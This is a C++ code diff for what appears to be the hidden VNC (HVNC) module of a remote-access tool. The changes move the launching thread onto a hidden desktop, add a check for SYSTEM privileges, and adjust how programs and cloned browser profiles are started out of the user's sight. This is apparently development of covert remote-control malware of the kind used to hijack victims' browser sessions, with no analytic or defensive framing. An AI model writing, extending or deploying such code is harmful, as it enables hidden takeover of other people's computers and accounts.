@@ -1885,8 +1885,49 @@ static void CloneProfileWithProgress(const fs::path& src, const fs::path& dst, c
     SendHvncProgress(100, label);
 }
 
+class ThreadDesktopSwitcher {
+    HDESK hPrev = NULL;
+public:
+    ThreadDesktopSwitcher(HDESK hNew) {
+        hPrev = GetThreadDesktop(GetCurrentThreadId());
+        if (hNew) {
+            SetThreadDesktop(hNew);
+        }
+    }
+    ~ThreadDesktopSwitcher() {
+        if (hPrev) {
+            SetThreadDesktop(hPrev);
+        }
+    }
+};
+
+static bool IsSystem() {
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        DWORD dwSize = 0;
+        GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
+        if (dwSize > 0) {
+            std::vector<BYTE> buffer(dwSize);
+            if (GetTokenInformation(hToken, TokenUser, buffer.data(), dwSize, &dwSize)) {
+                PTOKEN_USER pTokenUser = (PTOKEN_USER)buffer.data();
+                PSID pSystemSid = NULL;
+                SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+                if (AllocateAndInitializeSid(&NtAuthority, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid)) {
+                    BOOL isSystem = EqualSid(pTokenUser->User.Sid, pSystemSid);
+                    FreeSid(pSystemSid);
+                    CloseHandle(hToken);
+                    return isSystem == TRUE;
+                }
+            }
+        }
+        CloseHandle(hToken);
+    }
+    return false;
+}
+
 static void LaunchOnDesktop(string path, bool isRetry = false, bool cloneBrowser = false) {
     if (!g_hHiddenDesktop) return;
+    ThreadDesktopSwitcher switcher(g_hHiddenDesktop);
     try {
         // Expand environment variables
         if (path.find('%') != string::npos) {
@@ -2177,7 +2218,10 @@ static void LaunchOnDesktop(string path, bool isRetry = false, bool cloneBrowser
         cmdLine.push_back(L'\0');
 
         uint32_t createFlags = CREATE_UNICODE_ENVIRONMENT | (isConsoleApp ? CREATE_NEW_CONSOLE : 0u);
-        HANDLE launchToken = GetLaunchToken();
+        HANDLE launchToken = NULL;
+        if (IsSystem()) {
+            launchToken = GetLaunchToken();
+        }
         LPVOID envBlock = nullptr;
         if (launchToken) {
             typedef BOOL(WINAPI* pfnCreateEnvironmentBlock)(LPVOID* lpEnvironment, HANDLE hToken, BOOL bInherit);
